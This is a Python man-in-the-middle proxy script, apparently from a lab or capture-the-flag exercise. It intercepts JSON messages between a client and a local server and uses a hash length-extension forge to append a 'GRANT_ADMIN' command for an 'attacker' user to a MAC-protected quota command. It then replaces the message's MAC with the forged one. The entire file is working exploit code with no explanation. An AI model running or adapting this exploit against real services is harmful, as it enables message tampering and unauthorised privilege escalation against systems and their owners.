#!/usr/bin/env python3
import sys, json, socket, threading
sys.path.insert(0, '../../tools')
from length_extension import forge

ORIGINAL    = b"CMD=SET_QUOTA&USER=bob&LIMIT=100"
SUFFIX      = b"&CMD=GRANT_ADMIN&USER=attacker"
KEY_LEN     = 14
LISTEN_PORT = 12346
SERVER_PORT = 12345

def intercept(data):
    try:
        msg = json.loads(data)
        if msg.get('command') == 'SEND_MESSAGE':
            #region call : forge()
            forged_message, forged_mac = forge(ORIGINAL, msg['mac'], SUFFIX, KEY_LEN)
            msg['content'] = forged_message.decode('latin-1')
            msg['mac'] = forged_mac
            msg['is_command'] = True
            print(f"[INTERCEPTED] Forged MAC: {forged_mac}")
            return json.dumps(msg).encode('utf-8')
    except:
        pass
    return data

def forward(src, dst, intercept_fn=None):
    while True:
        try:
            data = src.recv(4096)
            if not data:
                break
            if intercept_fn:
                data = intercept_fn(data)
            dst.send(data)
        except:
            break

def handle(client):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(('127.0.0.2', SERVER_PORT))
    threading.Thread(target=forward, args=(client, server, intercept), daemon=True).start()
    threading.Thread(target=forward, args=(server, client), daemon=True).start()

proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
proxy.bind(('localhost', LISTEN_PORT))
proxy.listen(5)
print(f"[PROXY] Listening on {LISTEN_PORT}, forwarding to {SERVER_PORT}")

while True:
    client, addr = proxy.accept()
    print(f"[PROXY] Connection from {addr}")
    threading.Thread(target=handle, args=(client,), daemon=True).start()